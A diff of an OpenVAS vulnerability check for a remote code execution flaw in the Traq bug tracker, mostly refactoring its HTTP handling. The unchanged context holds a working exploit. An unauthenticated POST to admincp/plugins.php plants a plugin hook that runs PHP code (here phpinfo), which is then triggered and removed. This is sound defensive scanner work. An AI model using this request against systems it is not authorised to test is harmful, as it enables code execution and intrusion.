@@ -1,6 +1,6 @@
 ###############################################################################
 # OpenVAS Vulnerability Test
-# $Id: gb_traq_50961.nasl 3117 2016-04-19 10:19:37Z benallard $
+# $Id: gb_traq_50961.nasl 5751 2017-03-28 14:37:16Z cfi $
 #
 # Traq 'authenticate()' Function Remote Code Execution Vulnerability
 #
@@ -25,11 +25,11 @@
 # Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
 ###############################################################################
 
-if (description)
+if(description)
 {
  script_oid("1.3.6.1.4.1.25623.1.0.103359");
  script_bugtraq_id(50961);
- script_version ("$Revision: 3117 $");
+ script_version ("$Revision: 5751 $");
 
  script_name("Traq 'authenticate()' Function Remote Code Execution Vulnerability");
 
@@ -38,9 +38,8 @@ if (description)
 
  script_tag(name:"cvss_base", value:"7.5");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:P/I:P/A:P");
- script_tag(name:"last_modification", value:"$Date: 2016-04-19 12:19:37 +0200 (Tue, 19 Apr 2016) $");
+ script_tag(name:"last_modification", value:"$Date: 2017-03-28 16:37:16 +0200 (Tue, 28 Mar 2017) $");
  script_tag(name:"creation_date", value:"2011-12-08 08:05:08 +0100 (Thu, 08 Dec 2011)");
- script_summary("Determine if installed Traq is vulnerable");
  script_category(ACT_ATTACK);
  script_family("Web application abuses");
  script_copyright("This script is Copyright (C) 2011 Greenbone Networks GmbH");
@@ -63,26 +62,19 @@ if (description)
 include("http_func.inc");
 include("host_details.inc");
 include("http_keepalive.inc");
-include("global_settings.inc");
    
 port = get_http_port(default:80);
-if(!get_port_state(port))exit(0);
-
 if(!can_host_php(port:port))exit(0);
-host = get_host_name();
-if( port != 80 && port != 443 )
-  host += ':' + port;
 
-dirs = make_list("/traq","/phptraq","/bugtracker",cgi_dirs());
+foreach dir( make_list_unique( "/traq", "/phptraq", "/bugtracker", cgi_dirs( port:port ) ) ) {
 
-foreach dir (dirs) {
+  if( dir == "/" ) dir = "";
+  url = dir + "/index.php";
+  buf = http_get_cache( item:url, port:port );
 
-  url = string(dir, "/index.php");
-  req = http_get(item:url, port:port);
-  result = http_keepalive_send_recv(port:port, data:req, bodyonly:FALSE);
+  if("Powered by Traq" >!< buf)continue; 
 
-  if("Powered by Traq" >!< result)continue; 
-
+  host = http_host_name( port:port );
   filename = string(dir,"/admincp/plugins.php?newhook");
   ex = "plugin_id=12323&title=1&execorder=0&hook=template_footer&code=phpinfo();die;";
 
@@ -93,14 +85,12 @@ foreach dir (dirs) {
 	       "Connection: close\r\n",
 	       "\r\n",
 	       ex);
-
   result = http_keepalive_send_recv(port:port, data:req, bodyonly:FALSE);
 
   req = string("GET ",dir,"/index.php HTTP/1.0\r\n",
 	       "Host: ", host, "\r\n",
 	       "Cmd: phpinfo();\r\n\r\n"
 	       );
-
   result = http_keepalive_send_recv(port:port, data:req, bodyonly:FALSE);
 
   if("<title>phpinfo()" >< result) {
@@ -108,7 +98,7 @@ foreach dir (dirs) {
     # on success remove the plugin
     url = string(dir, "/admincp/plugins.php?remove&plugin=12323");
     req = http_get(item:url, port:port);
-    result = http_keepalive_send_recv(port:port, data:req, bodyonly:FALSE);
+    http_keepalive_send_recv(port:port, data:req, bodyonly:FALSE);
 
     security_message(port:port);
     exit(0);
